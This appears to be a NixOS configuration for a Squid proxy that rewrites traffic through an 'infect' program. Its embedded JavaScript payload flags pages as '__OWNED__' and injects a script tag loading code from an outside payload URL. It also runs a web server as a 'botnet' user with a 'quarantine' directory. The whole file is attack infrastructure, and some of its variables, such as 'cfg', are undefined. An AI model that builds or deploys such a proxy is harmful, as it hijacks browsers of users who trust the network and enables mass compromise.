{ pkgs, ... }:

let

  payloadURL = "";

  squidConfig = ''
    acl all src all

    acl SSL_ports port 443
    acl Safe_ports port 80		# http
    acl Safe_ports port 21		# ftp
    acl Safe_ports port 443		# https
    acl Safe_ports port 70		# gopher
    acl Safe_ports port 210		# wais
    acl Safe_ports port 1025-65535	# unregistered ports
    acl Safe_ports port 280		# http-mgmt
    acl Safe_ports port 488		# gss-http
    acl Safe_ports port 591		# filemaker
    acl Safe_ports port 777		# multiling http
    acl CONNECT method CONNECT

    http_access deny !Safe_ports
    http_access deny CONNECT !SSL_ports

    http_access allow localhost
    http_access deny all

    forwarded_for off
    via off

    url_rewrite_program ${infect}/infect
  '';

  infect = pkgs.stdenv.mkDerivation {
    name = "infect";
    exe = ''
      #!/bin/sh
      export PAYLOAD=${payload}
      export INFECTION_DIR=${toString cfg.quarantine}
      export INFECTION_PORT=${toString cfg.infectionPort}
      exec ${pkgs.python3}/bin/python3 ${./infect.py}
    '';
    builder = builtins.toFile "builder.sh" ''
      . $stdenv/setup
      mkdir $out
      echo "$exe" > $out/infect
      chmod +x $out/infect
    '';
  };

  payload = builtins.toFile "payload.js" ''
    (function(){
      if (!window.__OWNED__) {
          window.__OWNED__ = true;
          var script = document.createElement('script');
          script.setAttribute('src', '${cfg.payloadURL}');
          document.getElementsByTagName('head')[0].appendChild(script);
      }
    })();
  '';

  mkQuarantine = ''
    [ -d /var/quarantine ] && rm -r /var/quarantine
    mkdir -p ${cfg.dir}
    chown ${cfg.user} ${cfg.dir}
    cp ${./htaccess} ${cfg.dir}/.htaccess
  '';

in {

  imports = [
    ./squid
  ];

  networking.firewall.allowedTCPPorts = [
    80 cfg.proxyPort
  ];

  services.httpd = {
    enable = true;
    user = "botnet";
    group = "botnet";
    adminAddr = "foo";
    virtualHosts = [
      {
        listen = [ { port = 80; } ];
        documentRoot = ./homepage;
      }
      {
        listen = [ { port = 13337; } ];
        documentRoot = "/var/quarantine";
      }
    ];
  };

}
